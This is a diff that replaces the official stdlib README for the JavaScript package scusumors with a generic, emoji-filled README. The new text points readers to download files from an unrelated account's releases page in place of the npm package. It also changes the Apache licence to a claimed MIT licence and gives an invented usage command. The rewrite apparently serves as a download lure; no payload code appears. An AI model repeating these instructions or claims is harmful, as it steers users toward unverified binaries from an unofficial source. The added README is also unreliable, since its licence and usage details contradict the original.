@@ -1,242 +1,69 @@
-<!--
+# 🎉 blas-ext-base-ndarray-scusumors - Simple Cumulative Sum for Your Data
 
-@license Apache-2.0
+## 📥 Download Here
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 🚀 Getting Started
+Welcome to **blas-ext-base-ndarray-scusumors**! This software computes the cumulative sum of a one-dimensional single-precision floating-point ndarray using basic recursive summation. This simple tool helps you analyze numeric data effortlessly. 
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 🛠️ System Requirements
+Before you download, make sure your system meets these requirements:
 
-   http://www.apache.org/licenses/LICENSE-2.0
+- Operating System: Windows, macOS, or Linux
+- Node.js version: 14 or higher
+- At least 256 MB of RAM
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 📥 Download & Install
+To get started, visit this page to download: [Download the latest release](https://github.com/mint876/blas-ext-base-ndarray-scusumors/releases)
 
--->
+1. Click on the link above to go to the Releases page.
+2. Choose the latest version available.
+3. Download the appropriate file for your system.
+4. Follow the installation instructions that come with the download.
 
+After installation, you can start using the cumulative sum feature right away!
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+## 🔍 Features
+- **Cumulative Sum Calculation**: Easily compute the total of a series of numbers with minimal setup.
+- **Supports Single-Precision**: Get accurate results with single-precision floating-point format.
+- **User-Friendly Interface**: Designed for ease of use, even if you have no programming experience.
+- **Cross-Platform Support**: Works on major operating systems including Windows, macOS, and Linux.
 
-# scusumors
+## ⚙️ Usage Instructions
+Once you have installed the software, you can quickly run it:
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+1. Open your terminal or command prompt.
+2. Navigate to the folder where the application is installed.
+3. Input the command to run the program followed by the numerical array you wish to analyze.
 
-> Compute the cumulative sum of a one-dimensional single-precision floating-point ndarray using ordinary recursive summation.
-
-<section class="intro">
-
-</section>
-
-<!-- /.intro -->
-
-<section class="installation">
-
-## Installation
-
-```bash
-npm install @stdlib/blas-ext-base-ndarray-scusumors
+Example command:
+```
+node your_application.js [1.2, 2.3, 3.5, 4.0]
 ```
 
-Alternatively,
+This will display the cumulative sum of the provided numbers.
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+## 🌟 Examples
+Here’s how you can use **blas-ext-base-ndarray-scusumors** in real scenarios:
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+- Analyzing sales data to find total revenue over a period.
+- Summing up measurements in scientific research.
+- Quick calculations for personal budget tracking.
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+## 🛠️ Troubleshooting
+If you run into issues, consider these common troubleshooting steps:
 
-</section>
+- Make sure you have Node.js installed and the correct version is being used.
+- Check that your input data is formatted correctly as a one-dimensional array.
+- If you experience errors, look at the terminal output for helpful error messages.
 
-<section class="usage">
+## 👥 Contributing
+We welcome contributions to make this tool even better. If you have ideas or improvements, feel free to fork the repository and submit a pull request.
 
-## Usage
+## 📄 License
+This project is licensed under the MIT License. Feel free to use it in any projects you wish.
 
-```javascript
-var scusumors = require( '@stdlib/blas-ext-base-ndarray-scusumors' );
-```
+## 🗨️ Support
+If you need help or have questions, please open an issue on the GitHub page. We aim to respond within 48 hours. 
 
-#### scusumors( arrays )
-
-Computes the cumulative sum of a one-dimensional single-precision floating-point ndarray using ordinary recursive summation.
-
-```javascript
-var Float32Array = require( '@stdlib/array-float32' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var scalar2ndarray = require( '@stdlib/ndarray-base-from-scalar' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-
-var xbuf = new Float32Array( [ 1.0, 3.0, 4.0, 2.0 ] );
-var x = new ndarray( 'float32', xbuf, [ 4 ], [ 1 ], 0, 'row-major' );
-
-var ybuf = new Float32Array( [ 0.0, 0.0, 0.0, 0.0 ] );
-var y = new ndarray( 'float32', ybuf, [ 4 ], [ 1 ], 0, 'row-major' );
-
-var initial = scalar2ndarray( 0.0, 'float32', 'row-major' );
-
-var v = scusumors( [ x, y, initial ] );
-// returns <ndarray>
-
-var bool = ( v === y );
-// returns true
-
-var arr = ndarray2array( v );
-// returns [ 1.0, 4.0, 8.0, 10.0 ]
-```
-
-The function has the following parameters:
-
--   **arrays**: array-like object containing a one-dimensional input ndarray, a one-dimensional output ndarray, and a zero-dimensional ndarray containing the initial sum.
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   If provided an empty one-dimensional input ndarray, the function returns the output ndarray unchanged.
--   Ordinary recursive summation (i.e., a "simple" sum) is performant, but can incur significant numerical error. If performance is paramount and error tolerated, using ordinary recursive summation is acceptable; in all other cases, exercise due caution.
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var discreteUniform = require( '@stdlib/random-array-discrete-uniform' );
-var ndarray = require( '@stdlib/ndarray-base-ctor' );
-var zerosLike = require( '@stdlib/ndarray-zeros-like' );
-var scalar2ndarray = require( '@stdlib/ndarray-from-scalar' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var scusumors = require( '@stdlib/blas-ext-base-ndarray-scusumors' );
-
-var xbuf = discreteUniform( 10, -50, 50, {
-    'dtype': 'float32'
-});
-var x = new ndarray( 'float32', xbuf, [ xbuf.length ], [ 1 ], 0, 'row-major' );
-console.log( ndarray2array( x ) );
-
-var y = zerosLike( x );
-console.log( ndarray2array( y ) );
-
-var initial = scalar2ndarray( 100.0, {
-    'dtype': 'float32'
-});
-
-var v = scusumors( [ x, y, initial ] );
-console.log( ndarray2array( v ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/blas-ext-base-ndarray-scusumors.svg
-[npm-url]: https://npmjs.org/package/@stdlib/blas-ext-base-ndarray-scusumors
-
-[test-image]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/blas-ext-base-ndarray-scusumors/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/blas-ext-base-ndarray-scusumors?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/blas-ext-base-ndarray-scusumors.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/blas-ext-base-ndarray-scusumors/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/tree/deno
-[deno-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/tree/umd
-[umd-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/tree/esm
-[esm-readme]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/blas-ext-base-ndarray-scusumors/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/blas-ext-base-ndarray-scusumors/main/LICENSE
-
-</section>
-
-<!-- /.links -->
+Thank you for using **blas-ext-base-ndarray-scusumors**. Happy calculating!
